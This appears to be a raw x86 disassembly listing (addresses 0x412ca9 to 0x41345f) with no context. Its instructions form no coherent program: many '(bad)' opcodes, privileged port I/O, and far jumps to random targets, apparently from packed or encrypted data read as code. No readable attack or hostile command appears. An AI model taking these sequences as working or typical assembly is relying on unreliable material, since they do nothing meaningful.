  412ca9:	ins    DWORD PTR es:[edi],dx
  412caa:	rcl    BYTE PTR [esp+eax*2],cl
  412cad:	cs rol cl,0x8b
  412cb1:	add    eax,0x2f5cff85
  412cb6:	mov    ds:0xb65897cf,al
  412cbb:	pop    es
  412cbc:	outs   dx,BYTE PTR ds:[esi]
  412cbd:	lods   al,BYTE PTR ds:[esi]
  412cbe:	clc    
  412cbf:	(bad)  
  412cc0:	leave  
  412cc1:	xor    al,0x7
  412cc3:	mov    ecx,0x3ed492e8
  412cc8:	cmp    ch,BYTE PTR [eax+eax*4+0x256c0049]
  412ccf:	fucomip st,st(0)
  412cd1:	lea    esi,[ebx+0x1]
  412cd4:	repz (bad) 
  412cd6:	fucomip st,st(4)
  412cd8:	mov    edi,0x405aa9ba
  412cdd:	popa   
  412cde:	push   cs
  412cdf:	icebp  
  412ce0:	pop    edi
  412ce1:	push   ss
  412ce2:	rcr    BYTE PTR [edi+0x74],cl
  412ce5:	icebp  
  412ce6:	push   ss
  412ce7:	in     al,dx
  412ce8:	and    eax,0x72282f6
  412ced:	and    esi,ecx
  412cef:	xchg   ebp,eax
  412cf0:	xor    esi,edx
  412cf2:	sub    edx,DWORD PTR [esp+ebp*4-0x67]
  412cf6:	push   ds
  412cf7:	push   0x7568c29b
  412cfc:	(bad)  
  412cfd:	and    ah,BYTE PTR [edx]
  412cff:	push   ebx
  412d00:	call   FWORD PTR [ebp+0xf7f7809]
  412d06:	ins    DWORD PTR es:[edi],dx
  412d07:	int3   
  412d08:	jg     0x412d66
  412d0a:	adc    ebx,DWORD PTR cs:[edx*4+0x2669e827]
  412d12:	ins    BYTE PTR es:[edi],dx
  412d13:	pop    ss
  412d14:	shl    ecx,0xc9
  412d17:	btr    DWORD PTR [ebx],esp
  412d1a:	test   al,0xe1
  412d1c:	dec    dl
  412d1e:	jl     0x412d0d
  412d20:	dec    esp
  412d21:	fcmovbe st,st(2)
  412d23:	jbe    0x412da2
  412d25:	sbb    esi,esi
  412d27:	test   al,0x87
  412d29:	cmp    dl,BYTE PTR [edx]
  412d2b:	add    BYTE PTR [ecx],0xe5
  412d2e:	das    
  412d2f:	sbb    dl,cl
  412d31:	and    BYTE PTR [ebp-0x8],bh
  412d34:	es cli 
  412d36:	imul   esp,DWORD PTR ds:[edx],0x5
  412d3a:	cli    
  412d3b:	dec    ebx
  412d3c:	shrd   DWORD PTR [esp+ecx*8],esp,cl
  412d40:	stc    
  412d41:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  412d43:	jb     0x412cce
  412d45:	add    edi,eax
  412d47:	std    
  412d48:	xor    DWORD PTR [ebx+0x7e],ecx
  412d4b:	sbb    bl,ah
  412d4d:	outs   dx,BYTE PTR ds:[esi]
  412d4e:	call   FWORD PTR [esi+0x2c]
  412d51:	mov    ax,0x1694
  412d55:	loop   0x412d32
  412d57:	lahf   
  412d58:	pop    ss
  412d59:	pushf  
  412d5a:	nop
  412d5b:	xlat   BYTE PTR ds:[ebx]
  412d5c:	scas   al,BYTE PTR es:[edi]
  412d5d:	fldcw  WORD PTR [eax]
  412d5f:	leave  
  412d60:	es test eax,0xdaa1775f
  412d66:	sub    DWORD PTR [edx+0x8a0fa95],0x7354929b
  412d70:	sar    BYTE PTR [edx],1
  412d72:	into   
  412d73:	pop    es
  412d74:	or     ecx,DWORD PTR [ecx+eax*4-0x6e]
  412d78:	sbb    eax,0x63c9d161
  412d7d:	(bad)  
  412d7f:	adc    ebp,edx
  412d81:	fwait
  412d82:	aas    
  412d83:	inc    esi
  412d84:	cld    
  412d85:	mul    ebp
  412d87:	or     esi,DWORD PTR ds:0x4f76d6be
  412d8d:	jle    0x412db0
  412d8f:	rcr    BYTE PTR [edi+0x3eaa5328],1
  412d95:	jb     0x412d8b
  412d97:	test   al,0xea
  412d99:	minps  xmm2,XMMWORD PTR [edi]
  412d9c:	and    al,BYTE PTR [ecx+0x2c]
  412d9f:	or     DWORD PTR [ebx],esp
  412da1:	pop    esi
  412da2:	(bad)  
  412da3:	stos   DWORD PTR es:[edi],eax
  412da4:	outs   dx,BYTE PTR ds:[esi]
  412da5:	jb     0x412d49
  412da7:	and    eax,0x5d42b05e
  412dac:	or     ebx,DWORD PTR [esi-0x1f]
  412daf:	push   eax
  412db0:	in     eax,0xff
  412db2:	mov    dl,BYTE PTR [ebx-0x50fdbabc]
  412db8:	sub    al,0x40
  412dba:	push   edi
  412dbb:	das    
  412dbc:	inc    ecx
  412dbd:	pop    ds
  412dbe:	fwait
  412dbf:	jb     0x412e2f
  412dc1:	push   edi
  412dc2:	pusha  
  412dc3:	xchg   esi,eax
  412dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dc5:	shl    BYTE PTR [ebx],1
  412dc7:	mov    ss,WORD PTR [esi-0x63]
  412dca:	xchg   edx,eax
  412dcb:	(bad)  
  412dcc:	sar    BYTE PTR [eax],1
  412dce:	pop    eax
  412dcf:	and    DWORD PTR [esi],0x25
  412dd2:	pop    ebx
  412dd3:	and    al,0x81
  412dd5:	or     esp,0x1c
  412dd8:	xor    eax,DWORD PTR [edi+0x4e]
  412ddb:	or     bl,BYTE PTR [ebx+0xa]
  412dde:	int3   
  412ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412de0:	cld    
  412de1:	cmp    eax,0x54110179
  412de6:	in     eax,dx
  412de7:	fdivr  DWORD PTR ds:0xd5fc943d
  412ded:	mov    edx,edx
  412def:	ss and eax,0x3f585e88
  412df5:	push   0xffffffac
  412df7:	ins    BYTE PTR es:[edi],dx
  412df8:	sub    DWORD PTR [edx-0x1adf008c],esp
  412dfe:	outs   dx,DWORD PTR ds:[esi]
  412dff:	aas    
  412e00:	hlt    
  412e01:	test   DWORD PTR [ecx-0x24c8b9b2],edx
  412e07:	aam    0x30
  412e09:	jg     0x412e15
  412e0b:	call   0x7187ba75
  412e10:	xor    BYTE PTR [ecx+0x38],al
  412e13:	adc    eax,0xeab051fa
  412e18:	xchg   ebx,eax
  412e19:	push   ds
  412e1a:	repz mov eax,ds:0x3f33b5b4
  412e20:	dec    ebp
  412e21:	loopne 0x412e86
  412e23:	jae    0x412e1c
  412e25:	out    0x7d,eax
  412e27:	push   ebx
  412e28:	lock (bad) [esi+ebp*2-0x58]
  412e2d:	fisttp WORD PTR [edx]
  412e2f:	xchg   BYTE PTR [eax+eax*4-0x2f1d0be5],bl
  412e36:	adc    eax,0xd911d90b
  412e3b:	jo     0x412dfb
  412e3d:	dec    esp
  412e3e:	sub    BYTE PTR [edi-0x13fa3513],dh
  412e44:	jnp    0x412dd5
  412e46:	hlt    
  412e47:	inc    ebx
  412e48:	jb     0x412e21
  412e4a:	cmp    DWORD PTR [ebx-0x20],ebx
  412e4d:	and    BYTE PTR [edx-0x35],0x21
  412e51:	add    DWORD PTR [edi+0x60ce201],0xd032f23
  412e5b:	jge    0x412e1e
  412e5d:	sub    ch,cl
  412e5f:	dec    edi
  412e60:	inc    esp
  412e61:	sub    al,0x67
  412e63:	xchg   ecx,eax
  412e64:	int    0x23
  412e66:	mov    WORD PTR [ebp+0x5e],ds
  412e69:	cmp    DWORD PTR [eax+edx*2],edx
  412e6c:	mov    edi,0x39b7e88a
  412e71:	mov    al,0x2d
  412e73:	mov    edi,0x1e4a6f6b
  412e78:	std    
  412e79:	push   ss
  412e7a:	comiss xmm2,DWORD PTR [ebp+0xf]
  412e7e:	xchg   edi,eax
  412e7f:	iret   
  412e80:	push   esi
  412e81:	or     BYTE PTR [ebx],bl
  412e83:	cmc    
  412e84:	pop    ebp
  412e85:	sahf   
  412e86:	mov    ds:0xf6050b44,eax
  412e8b:	xor    eax,0x84fe84a1
  412e90:	lods   al,BYTE PTR ds:[esi]
  412e91:	test   al,0xb3
  412e93:	inc    eax
  412e94:	test   DWORD PTR [ecx],0x7f1354fa
  412e9a:	ror    BYTE PTR [edx-0x5d],cl
  412e9d:	test   al,0xd
  412e9f:	sbb    ebx,ebx
  412ea1:	xchg   esp,eax
  412ea2:	mov    cl,0x67
  412ea4:	push   esp
  412ea5:	sbb    DWORD PTR [esi+0x28],eax
  412ea8:	aas    
  412ea9:	fs inc esp
  412eab:	jmp    0xf1b9:0xc76ef23e
  412eb2:	mov    BYTE PTR [edx-0x16],0xc2
  412eb6:	xchg   edi,ebx
  412eb8:	mov    al,ds:0x746c3c06
  412ebd:	scas   al,BYTE PTR es:[edi]
  412ebe:	jnp    0x412e8b
  412ec0:	out    0x34,eax
  412ec2:	fwait
  412ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec4:	dec    ebp
  412ec5:	std    
  412ec6:	(bad)  
  412ec8:	jbe    0x412ebe
  412eca:	ja     0x412ef7
  412ecc:	push   ecx
  412ecd:	(bad)  
  412ece:	adc    BYTE PTR [ebp+0x6a],ah
  412ed1:	or     eax,DWORD PTR [edi]
  412ed3:	jmp    DWORD PTR [ecx]
  412ed5:	shl    DWORD PTR [esi-0x6ebfeeb4],0x5f
  412edc:	cmp    al,0x71
  412ede:	mov    edx,0xba0f6172
  412ee3:	xor    esp,DWORD PTR [ebx-0x769e2d84]
  412ee9:	enter  0xdf32,0xef
  412eed:	imul   ebx,DWORD PTR [esi],0xa8c85d82
  412ef3:	aaa    
  412ef4:	lock xchg ecx,eax
  412ef6:	into   
  412ef7:	jae    0x412f69
  412ef9:	stos   BYTE PTR es:[edi],al
  412efa:	daa    
  412efb:	nop
  412efc:	sub    BYTE PTR ds:0x17f2927f,bh
  412f02:	pop    es
  412f03:	mov    edx,0x8e1b4274
  412f08:	inc    ebp
  412f09:	imul   ebp,DWORD PTR [edx-0x49ae86f6],0x6ca56c37
  412f13:	jmp    0x46a4d5ad
  412f18:	push   esp
  412f19:	jae    0x412f22
  412f1b:	inc    eax
  412f1c:	dec    ebp
  412f1d:	pop    edx
  412f1e:	mov    eax,0x6eb47b36
  412f23:	ins    BYTE PTR es:[edi],dx
  412f24:	jne    0x412f48
  412f26:	fld    TBYTE PTR [edx+0x34582787]
  412f2c:	push   eax
  412f2d:	test   eax,0x9f19cf1
  412f32:	dec    esp
  412f33:	adc    dl,bl
  412f35:	mov    ecx,0xbdc51750
  412f3a:	dec    eax
  412f3b:	sub    al,0x2b
  412f3d:	rcl    BYTE PTR [edi+edi*8-0x7fe06a6c],cl
  412f44:	jb     0x412f80
  412f46:	arpl   si,bx
  412f48:	cmp    cl,BYTE PTR [ebx-0x4967d722]
  412f4e:	cmp    BYTE PTR cs:[esi],ch
  412f51:	pop    es
  412f52:	pop    ebx
  412f53:	mov    dl,0x13
  412f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f56:	or     eax,DWORD PTR [ecx+edx*2]
  412f59:	jecxz  0x412f2a
  412f5b:	es dec esp
  412f5d:	add    eax,ebp
  412f5f:	pop    es
  412f60:	xchg   ebp,eax
  412f61:	inc    ebp
  412f62:	retf   
  412f63:	jecxz  0x412ef2
  412f65:	cld    
  412f66:	jge    0x412f88
  412f68:	(bad)  
  412f69:	retf   
  412f6a:	icebp  
  412f6b:	sbb    BYTE PTR [edi+0x4b5e954d],bh
  412f71:	ja     0x412f26
  412f73:	test   eax,0xbcebce4c
  412f78:	pop    ss
  412f79:	sub    al,0x9
  412f7b:	jmp    0x412fd1
  412f7d:	(bad)
  412f81:	(bad)  
  412f82:	fld    DWORD PTR [ecx-0x79]
  412f85:	sbb    cl,BYTE PTR [ecx]
  412f87:	int    0xd5
  412f89:	dec    edx
  412f8a:	adc    BYTE PTR [esi+0x54],ah
  412f8d:	adc    al,0x87
  412f8f:	and    eax,ebx
  412f91:	dec    eax
  412f92:	mov    dl,0xd4
  412f94:	xchg   ebp,eax
  412f95:	push   ecx
  412f96:	shl    BYTE PTR [ebp+0x1e],0xf4
  412f9a:	jnp    0x412f53
  412f9c:	push   0xbff14a7
  412fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fa2:	jl     0x412fa6
  412fa4:	jecxz  0x412ffd
  412fa6:	pop    edx
  412fa7:	gs ins DWORD PTR es:[edi],dx
  412fa9:	(bad)  
  412faa:	rcr    DWORD PTR [esi-0x5c],cl
  412fad:	lock pushf 
  412faf:	and    cl,BYTE PTR [esi-0x3e0b807]
  412fb5:	ss ins DWORD PTR es:[edi],dx
  412fb7:	dec    esi
  412fb8:	mov    esi,0x35d7edeb
  412fbd:	and    ch,BYTE PTR [edi+0x7e623dc8]
  412fc3:	cmp    DWORD PTR [ecx+0x1ed27422],esi
  412fc9:	call   0xabed:0x50ac22b3
  412fd0:	gs sbb al,0x74
  412fd3:	je     0x413025
  412fd5:	dec    BYTE PTR ds:[edx]
  412fd8:	jmp    0x8bcb:0x8a9289b3
  412fdf:	or     al,0xfe
  412fe1:	daa    
  412fe2:	mov    al,0x21
  412fe4:	enter  0x891b,0x91
  412fe8:	mov    es,WORD PTR [edi-0x78eea78]
  412fee:	or     al,0x8
  412ff0:	pop    ecx
  412ff1:	sbb    dl,BYTE PTR [eax+eiz*2-0x43]
  412ff5:	in     eax,dx
  412ff6:	xchg   ecx,ebp
  412ff8:	sahf   
  412ff9:	xor    edx,DWORD PTR [edx-0x9]
  412ffc:	adc    dl,BYTE PTR [esi+0x5e7ac12a]
  413002:	arpl   WORD PTR [ebx+ecx*8],bp
  413005:	jge    0x412fa6
  413007:	fs stc 
  413009:	and    edx,edi
  41300b:	and    al,0x1f
  41300d:	bound  esp,QWORD PTR [ebx-0x54c0c4e1]
  413013:	mov    ds:0xa8bb906f,al
  413018:	lods   eax,DWORD PTR ds:[esi]
  413019:	mov    edi,DWORD PTR [eax-0x345cbfc6]
  41301f:	mov    cl,0x51
  413021:	push   cs
  413022:	out    dx,eax
  413023:	adc    ecx,DWORD PTR [edi+edi*2-0x4f8a1f99]
  41302a:	xor    DWORD PTR ds:[edx+0x2d],esi
  41302e:	lea    ecx,[ebp+0x7f]
  413031:	add    al,bl
  413033:	add    bl,BYTE PTR [edi+0x5b28e1eb]
  413039:	shr    DWORD PTR [eax-0x5019b496],1
  41303f:	push   ss
  413040:	xor    esi,esp
  413042:	cmp    ebx,eax
  413044:	stos   BYTE PTR es:[edi],al
  413045:	ss (bad) 
  413047:	fmul   QWORD PTR [esi-0x7fe91d64]
  41304d:	int    0x87
  41304f:	dec    edx
  413050:	xlat   BYTE PTR ds:[ebx]
  413051:	aas    
  413052:	dec    eax
  413053:	sub    BYTE PTR [eax],ch
  413055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413056:	xor    eax,0xdb31a765
  41305b:	lods   eax,DWORD PTR ds:[esi]
  41305c:	ret    
  41305d:	mov    ebx,0x1a362aba
  413062:	mov    al,ds:0xf71ce8b0
  413067:	(bad)  
  41306b:	inc    esi
  41306c:	ret    0x6ea5
  41306f:	cmp    eax,eax
  413071:	jmp    0x4130ee
  413073:	mov    ds:0xf3265520,al
  413078:	pop    es
  413079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41307a:	dec    esp
  41307b:	retf   0xe95e
  41307e:	or     BYTE PTR [edi+edx*1+0xfcce594],bl
  413085:	sbb    ebx,esi
  413087:	add    al,0xe3
  413089:	jbe    0x4130d2
  41308b:	pop    esi
  41308c:	sbb    ah,BYTE PTR [edi+ebx*2+0x39412300]
  413093:	add    DWORD PTR [edx],esi
  413095:	xchg   ebp,eax
  413096:	ins    DWORD PTR es:[edi],dx
  413097:	push   esp
  413098:	pop    ss
  413099:	cli    
  41309a:	dec    ebx
  41309b:	xchg   ebp,eax
  41309c:	xchg   edi,eax
  41309d:	mov    dh,0xce
  41309f:	push   0xffffffb8
  4130a1:	push   ebp
  4130a2:	fsub   DWORD PTR [ebp+0x592716e6]
  4130a8:	loop   0x4130e5
  4130aa:	push   edx
  4130ab:	inc    ecx
  4130ac:	(bad)  
  4130ad:	retf   
  4130ae:	or     DWORD PTR [esp+eax*8+0x51],0xb60346b5
  4130b6:	or     eax,0x8366c3c2
  4130bb:	sbb    dh,bl
  4130bd:	ins    DWORD PTR es:[edi],dx
  4130be:	imul   ebp,DWORD PTR [ebx+ecx*2],0x27aa828f
  4130c5:	adc    eax,0x252408f7
  4130ca:	mov    bh,0x37
  4130cc:	mov    bl,0xee
  4130ce:	cld    
  4130cf:	rcl    bl,0xd3
  4130d2:	dec    edx
  4130d3:	cmp    BYTE PTR [ecx],ch
  4130d5:	mov    WORD PTR [ecx+0x6ad1b147],fs
  4130db:	retf   0x6f73
  4130de:	mov    ecx,0xfdc62c42
  4130e3:	xchg   ah,bl
  4130e5:	adc    DWORD PTR cs:[ebp-0x26],edi
  4130e9:	push   esi
  4130ea:	add    BYTE PTR [ecx+0x49],dh
  4130ed:	shr    BYTE PTR [ebx],cl
  4130ef:	shl    DWORD PTR gs:[ecx],1
  4130f2:	out    dx,eax
  4130f3:	outs   dx,DWORD PTR ds:[esi]
  4130f4:	scas   eax,DWORD PTR es:[edi]
  4130f5:	inc    ebp
  4130f6:	pop    edi
  4130f7:	mov    ?,esp
  4130f9:	ja     0x413125
  4130fb:	test   BYTE PTR [ebp-0x7eb70b33],al
  413101:	xchg   BYTE PTR [ebx+esi*8+0x36b83d9a],al
  413108:	inc    edi
  413109:	and    DWORD PTR [edi],ebx
  41310b:	cld    
  41310c:	pop    edx
  41310d:	mov    ebx,0x2bfbcef
  413112:	lods   eax,DWORD PTR ds:[esi]
  413113:	(bad)
  413116:	cmc    
  413117:	lea    eax,[ebx+edx*8+0x55]
  41311b:	(bad)  
  41311c:	cmp    DWORD PTR [di-0x3535],ebp
  413121:	sbb    eax,0xd84f4be9
  413126:	ja     0x413139
  413128:	mov    ds:0x24e317d1,al
  41312d:	mov    esi,0x3a87d1ab
  413132:	arpl   WORD PTR [ecx+ebp*2],di
  413135:	pop    edx
  413136:	(bad)  [edi+eax*1]
  413139:	enter  0x893a,0xff
  41313d:	pushf  
  41313e:	enter  0x4f18,0xe2
  413142:	jg     0x413145
  413144:	inc    esp
  413145:	outs   dx,BYTE PTR ds:[esi]
  413146:	and    dl,BYTE PTR [eax]
  413148:	jge    0x4131af
  41314a:	fs popf 
  41314c:	sub    al,0x8d
  41314e:	imul   ebp,DWORD PTR [edi+0x661c2373],0xebc67a26
  413158:	jecxz  0x413196
  41315a:	push   ebp
  41315b:	jnp    0x413124
  41315d:	call   0x984:0x1d5afd13
  413164:	push   edi
  413165:	hlt    
  413166:	xlat   BYTE PTR ds:[ebx]
  413167:	lahf   
  413168:	push   edi
  413169:	in     eax,dx
  41316a:	jo     0x413154
  41316c:	xchg   esp,eax
  41316d:	jmp    0xf25e093c
  413172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413173:	push   ebx
  413174:	lods   al,BYTE PTR ds:[esi]
  413175:	fistp  QWORD PTR [edi+edi*8-0x358190a8]
  41317c:	mov    edx,0xc4a74ed2
  413181:	and    eax,DWORD PTR [ecx-0x19027ddb]
  413187:	cmp    al,0x7a
  413189:	mov    ecx,0x23601c50
  41318e:	push   ds
  41318f:	sbb    eax,0xdfa02959
  413194:	inc    ecx
  413195:	sub    edx,DWORD PTR [eax-0x8]
  413198:	push   ebp
  413199:	sub    ecx,DWORD PTR [ecx]
  41319b:	lahf   
  41319c:	fwait
  41319d:	scas   eax,DWORD PTR es:[edi]
  41319e:	in     al,0x1a
  4131a0:	cmp    DWORD PTR [esi+edx*2+0x3c972e17],edi
  4131a7:	ss and eax,0x80d60b61
  4131ad:	rol    DWORD PTR [ebp-0x318d5a55],1
  4131b3:	sub    eax,DWORD PTR [ecx]
  4131b5:	call   0x84bf:0x13b4112
  4131bc:	jmp    0x41315b
  4131be:	xchg   ebp,eax
  4131bf:	mov    ecx,0x14f4b47a
  4131c4:	in     eax,0x54
  4131c6:	inc    ebp
  4131c7:	(bad)  
  4131c8:	pop    ds
  4131c9:	fisubr DWORD PTR [eax+0x2c]
  4131cc:	mov    DWORD PTR [ebx+ebp*8-0x3b],0xf64648ea
  4131d4:	adc    eax,0xe258c172
  4131d9:	fdivp  st(2),st
  4131db:	cmc    
  4131dc:	int    0x87
  4131de:	mov    bh,0xf9
  4131e0:	out    dx,eax
  4131e1:	stc    
  4131e2:	and    al,0x10
  4131e4:	cld    
  4131e5:	cmp    ebp,DWORD PTR [edx-0x30]
  4131e8:	pinsrw mm2,ecx,0xbe
  4131ec:	lahf   
  4131ed:	or     ecx,ebx
  4131ef:	inc    esi
  4131f0:	out    dx,al
  4131f1:	ror    BYTE PTR ds:0xb9e506d6,0x2b
  4131f8:	lea    ebx,[edi+0x2162cdb0]
  4131fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131ff:	outs   dx,DWORD PTR ds:[esi]
  413200:	xchg   ebp,eax
  413201:	cmp    al,0x2e
  413203:	ficom  WORD PTR [ebx+0x3d9d3fee]
  413209:	sti    
  41320a:	xor    eax,0x6a3687ab
  41320f:	xchg   ecx,eax
  413210:	jle    0x413209
  413212:	mov    cl,0xff
  413214:	xchg   esp,eax
  413215:	in     eax,0xf
  413217:	pop    ss
  413218:	fisttp WORD PTR [ebp-0x78]
  41321b:	and    eax,0x4b78284a
  413220:	jne    0x41327b
  413222:	dec    ebp
  413223:	cmp    ebx,DWORD PTR [esi-0x24]
  413226:	test   al,0xc4
  413228:	adc    DWORD PTR [ebp-0xf],ebx
  41322b:	shl    DWORD PTR [ebp-0x43],1
  41322e:	jb     0x41327c
  413230:	pop    ss
  413231:	or     BYTE PTR gs:[ebx-0x3c002c27],ch
  413238:	sti    
  413239:	cmp    dh,BYTE PTR [eax]
  41323b:	dec    ebx
  41323c:	cmc    
  41323d:	or     al,0xed
  41323f:	xchg   ebx,eax
  413240:	lods   al,BYTE PTR ds:[esi]
  413241:	mov    dh,0x7
  413243:	xor    BYTE PTR [edx],0x8a
  413246:	mov    ds:0x64948b1c,eax
  41324b:	add    al,0x4e
  41324d:	ror    DWORD PTR [ecx-0x28],1
  413250:	xchg   esp,esp
  413252:	mov    ah,0x93
  413254:	in     al,0xaa
  413256:	ins    BYTE PTR es:[edi],dx
  413257:	pop    edi
  413258:	scas   eax,DWORD PTR es:[edi]
  413259:	push   ss
  41325a:	out    0x6b,eax
  41325c:	sbb    DWORD PTR [eax-0x4f2b2ca0],esp
  413262:	xchg   esp,eax
  413263:	shl    DWORD PTR [edx+0x25],1
  413266:	jge    0x413284
  413268:	outs   dx,BYTE PTR ds:[esi]
  413269:	mov    ebp,0x60044a4e
  41326e:	inc    esi
  41326f:	push   ebp
  413270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413271:	pop    esp
  413272:	hlt    
  413273:	xchg   ebp,eax
  413274:	ins    BYTE PTR es:[edi],dx
  413275:	call   FWORD PTR [esi+0x5d7476f7]
  41327b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41327c:	outs   dx,BYTE PTR ds:[esi]
  41327d:	push   esp
  41327e:	xor    dl,ch
  413280:	xor    esp,DWORD PTR [eax+ecx*2]
  413283:	shl    BYTE PTR [eax],0x5a
  413286:	pop    ds
  413287:	aam    0x45
  413289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41328a:	xor    DWORD PTR [ebp+0x5b80357a],eax
  413290:	pop    eax
  413291:	inc    edi
  413292:	inc    ebp
  413293:	or     al,0x25
  413295:	adc    edx,DWORD PTR [esi]
  413297:	imul   esp,DWORD PTR [ecx+0x1b],0x95048ee
  41329e:	and    al,0x56
  4132a0:	mov    dl,0x91
  4132a2:	test   BYTE PTR [ebx-0xd],bl
  4132a5:	mov    DWORD PTR [eax-0x62],esp
  4132a8:	sbb    eax,0xb0dc5386
  4132ad:	jne    0x4132fd
  4132af:	ret    0xc879
  4132b2:	popf   
  4132b3:	sbb    DWORD PTR [ebp-0x22],ebp
  4132b6:	out    dx,eax
  4132b7:	sub    BYTE PTR [ebp+0x5f0a522f],bl
  4132bd:	xchg   ebp,eax
  4132be:	xor    ch,BYTE PTR [esi+0x23]
  4132c1:	(bad)  
  4132c3:	mov    bh,0x5d
  4132c5:	pop    es
  4132c6:	inc    ebx
  4132c7:	jbe    0x413306
  4132c9:	fdiv   st,st(4)
  4132cb:	test   eax,0x3a7803f3
  4132d0:	mov    ecx,ebp
  4132d2:	loopne 0x413275
  4132d4:	inc    ebp
  4132d5:	jle    0x41327f
  4132d7:	shr    edx,1
  4132d9:	xchg   edi,eax
  4132da:	cli    
  4132db:	jbe    0x4132cf
  4132dd:	jle    0x413351
  4132df:	lds    esi,FWORD PTR [edx]
  4132e1:	pop    edx
  4132e2:	data16 (bad) 
  4132e4:	out    0x5e,eax
  4132e6:	or     edx,DWORD PTR [eax+0x2f]
  4132e9:	adc    BYTE PTR [ecx],0x70
  4132ec:	mov    al,BYTE PTR [edi]
  4132ee:	fst    DWORD PTR [edi+0x2]
  4132f1:	mov    ebp,0x74af929f
  4132f6:	test   ah,cl
  4132f8:	daa    
  4132f9:	test   al,0x29
  4132fb:	jle    0x41333f
  4132fd:	sbb    eax,0x2835d2d3
  413302:	gs ficomp WORD PTR gs:[esi-0x6f38bb8b]
  41330a:	popf   
  41330b:	sub    eax,0xe90614ba
  413310:	inc    esp
  413311:	repnz repz test BYTE PTR fs:[ebx+ebx*2-0x8],ah
  413318:	sub    cl,BYTE PTR [ebp+0x5b693160]
  41331e:	into   
  41331f:	cs cli 
  413321:	imul   ebx,DWORD PTR [ebx+eiz*1-0x73cd66cb],0xffffffa2
  413329:	jmp    0x3560a872
  41332e:	mov    ebx,0xe6bca398
  413333:	dec    ebp
  413334:	xor    DWORD PTR [edi+edi*1+0x59],0x2f
  413339:	out    0x69,al
  41333b:	push   ds
  41333c:	inc    edi
  41333d:	enter  0x4a35,0x6e
  413341:	ins    BYTE PTR es:[edi],dx
  413342:	push   0x50c09105
  413347:	xor    eax,0xe186cc0d
  41334c:	xchg   ebx,eax
  41334d:	jmp    0x4133c4
  41334f:	adc    DWORD PTR [edx-0x5a93590],ecx
  413355:	mov    dh,0xe8
  413357:	outs   dx,DWORD PTR ds:[esi]
  413358:	xor    DWORD PTR [ebx-0x5e7b4829],ebp
  41335e:	xor    ebp,DWORD PTR [ecx+0x79]
  413361:	adc    ah,dh
  413363:	inc    ebx
  413364:	or     eax,0x328b8d32
  413369:	cmp    al,0x1e
  41336b:	repnz mov ds:0x5c173d07,al
  413371:	dec    esi
  413372:	inc    edx
  413373:	mov    edi,0xddc891e5
  413378:	mov    ds:0x9d38f63f,al
  41337d:	dec    eax
  41337e:	ret    0x254f
  413381:	xor    al,0xd6
  413383:	xchg   esp,eax
  413384:	adc    DWORD PTR [edi-0x30],esp
  413387:	xor    al,0x96
  413389:	out    dx,eax
  41338a:	xor    eax,0x2274dae7
  41338f:	cmp    al,0x8c
  413391:	or     eax,0xd82a5246
  413396:	push   ss
  413397:	or     esi,ebp
  413399:	jg     0x4133cf
  41339b:	xor    esi,eax
  41339d:	dec    ecx
  41339e:	loope  0x4133ed
  4133a0:	jecxz  0x4133e1
  4133a2:	test   DWORD PTR [ecx+0x66],ebx
  4133a5:	mov    eax,ds:0x982b4afb
  4133aa:	pop    esi
  4133ab:	in     al,dx
  4133ac:	(bad)  
  4133ad:	retf   
  4133ae:	std    
  4133af:	jge    0x4133e3
  4133b1:	clc    
  4133b2:	repnz mov ds:0x5ada6c57,al
  4133b8:	cmp    ah,BYTE PTR [eax+0x24cb35a9]
  4133be:	xor    bl,0x85
  4133c1:	jno    0x4133bf
  4133c3:	out    0x9e,al
  4133c5:	(bad)  [ebx]
  4133c7:	mov    DWORD PTR ds:0x110fe4c7,ebp
  4133cd:	bound  ebx,QWORD PTR [ebx]
  4133cf:	dec    esp
  4133d0:	push   0x847adf30
  4133d5:	in     eax,dx
  4133d6:	test   eax,0x3c866fb9
  4133db:	test   ch,0x76
  4133de:	push   ds
  4133df:	cdq    
  4133e0:	int3   
  4133e1:	lock pop ds
  4133e3:	jecxz  0x4133a4
  4133e5:	test   eax,ebx
  4133e7:	jo     0x413468
  4133e9:	lock sub DWORD PTR [esi-0x78],0x1c
  4133ee:	int    0x5b
  4133f0:	scas   eax,DWORD PTR es:[edi]
  4133f1:	and    esi,esi
  4133f3:	dec    esp
  4133f4:	ins    BYTE PTR es:[edi],dx
  4133f5:	adc    eax,0xb363b080
  4133fa:	mov    cl,0xac
  4133fc:	daa    
  4133fd:	mov    cl,0x4e
  4133ff:	pop    edi
  413400:	jmp    0x41339b
  413402:	and    ecx,edi
  413404:	inc    ebx
  413405:	test   cl,0xc7
  413408:	push   ds
  413409:	dec    esp
  41340a:	cmc    
  41340b:	jns    0x41344b
  41340d:	in     eax,dx
  41340e:	sti    
  41340f:	and    DWORD PTR [ecx],eax
  413411:	mov    esi,0x6aa371ca
  413416:	arpl   si,si
  413418:	pop    ds
  413419:	and    al,0xc9
  41341b:	imul   ebx,DWORD PTR [edi+0x2f540799],0xbbbe053a
  413425:	(bad)  
  413426:	in     al,dx
  413427:	sub    ah,BYTE PTR [eax+0x72626c1e]
  41342d:	stc    
  41342e:	out    dx,al
  41342f:	(bad)  
  413430:	pop    ebx
  413431:	jno    0x413467
  413433:	jmp    0x413408
  413435:	(bad)  
  413438:	inc    edx
  413439:	mov    esp,0x2881b455
  41343e:	in     al,dx
  41343f:	inc    edi
  413440:	cmp    ah,BYTE PTR [ebx]
  413442:	fs sar ebp,cl
  413445:	and    esp,DWORD PTR ds:0x81012eee
  41344b:	push   0x4
  41344d:	push   ebx
  41344e:	call   0xb230d8e8
  413453:	aas    
  413454:	add    bh,BYTE PTR [bp+di]
  413457:	dec    ebx
  413458:	mov    cl,0x67
  41345a:	dec    esi
  41345b:	adc    ah,BYTE PTR [edx+0x3]
  41345e:	in     eax,dx
  41345f:	or     al,0x40
